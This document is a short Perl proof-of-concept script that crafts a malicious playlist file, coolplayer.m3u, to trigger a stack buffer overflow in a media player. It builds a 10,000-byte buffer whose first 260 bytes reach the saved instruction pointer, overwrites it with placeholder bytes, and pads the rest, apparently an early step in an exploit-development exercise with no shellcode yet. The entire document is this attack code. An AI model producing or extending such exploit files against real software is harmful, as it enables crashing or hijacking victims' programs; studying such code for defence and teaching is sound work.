#!/usr/bin/perl

my $buffsize = 10000;       # set consistent buffer size
my $junk =  "\x41" x 260;   # Offset to EIP
my $eip = "\x42" x 4;

my $sploit = $junk.$eip;	    # build sploit version of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); #fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# Write Exploit Buffer to File
my $file = "coolplayer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer Size: " . length($buffer) . "\n";


